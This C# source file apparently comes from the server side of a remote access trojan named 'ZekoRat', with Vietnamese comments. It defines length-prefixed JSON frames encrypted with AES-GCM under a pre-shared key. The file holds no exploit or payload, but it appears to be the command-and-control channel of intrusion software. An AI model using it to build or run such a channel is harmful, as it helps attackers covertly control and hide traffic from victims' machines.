using System.Buffers.Binary;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;

namespace ZekoRat.Server;

/// <summary>
/// Khung truyền: [4 byte độ dài LE][payload]
/// payload = nonce(12) + tag(16) + ciphertext  khi bật PSK
///           hoặc json thô                        khi tắt PSK
/// </summary>
public static class Proto
{
    public static readonly JsonSerializerOptions Json = new()
    {
        PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
        DefaultIgnoreCondition = System.Text.Json.Serialization.JsonIgnoreCondition.WhenWritingNull
    };

    public static byte[] Encode(JsonObject obj, byte[]? psk)
    {
        var json = Encoding.UTF8.GetBytes(obj.ToJsonString(Json));
        if (psk is null || psk.Length == 0)
            return json;

        var nonce = RandomNumberGenerator.GetBytes(12);
        var ct = new byte[json.Length];
        var tag = new byte[16];
        using var gcm = new AesGcm(psk, 16);
        gcm.Encrypt(nonce, json, ct, tag);

        var payload = new byte[12 + 16 + ct.Length];
        Buffer.BlockCopy(nonce, 0, payload, 0, 12);
        Buffer.BlockCopy(tag, 0, payload, 12, 16);
        Buffer.BlockCopy(ct, 0, payload, 28, ct.Length);
        return payload;
    }

    public static JsonObject? Decode(byte[] payload, byte[]? psk)
    {
        byte[] json;
        if (psk is null || psk.Length == 0)
        {
            json = payload;
        }
        else
        {
            if (payload.Length < 29) return null;
            var nonce = payload.AsSpan(0, 12).ToArray();
            var tag = payload.AsSpan(12, 16).ToArray();
            var ct = payload.AsSpan(28).ToArray();
            json = new byte[ct.Length];
            try
            {
                using var gcm = new AesGcm(psk, 16);
                gcm.Decrypt(nonce, ct, tag, json);
            }
            catch { return null; }
        }
        try
        {
            return JsonNode.Parse(json) as JsonObject;
        }
        catch { return null; }
    }

    public static async Task WriteFrameAsync(Stream s, JsonObject obj, byte[]? psk, CancellationToken ct)
    {
        var payload = Encode(obj, psk);
        var head = new byte[4];
        BinaryPrimitives.WriteInt32LittleEndian(head, payload.Length);
        await s.WriteAsync(head, ct);
        await s.WriteAsync(payload, ct);
        await s.FlushAsync(ct);
    }

    public static async Task<byte[]?> ReadFrameAsync(Stream s, CancellationToken ct)
    {
        var head = new byte[4];
        if (!await ReadExact(s, head, ct)) return null;
        var len = BinaryPrimitives.ReadInt32LittleEndian(head);
        if (len <= 0 || len > 64 * 1024 * 1024) return null;
        var payload = new byte[len];
        if (!await ReadExact(s, payload, ct)) return null;
        return payload;
    }

    static async Task<bool> ReadExact(Stream s, byte[] buf, CancellationToken ct)
    {
        int off = 0;
        while (off < buf.Length)
        {
            int n = await s.ReadAsync(buf.AsMemory(off), ct);
            if (n <= 0) return false;
            off += n;
        }
        return true;
    }
}
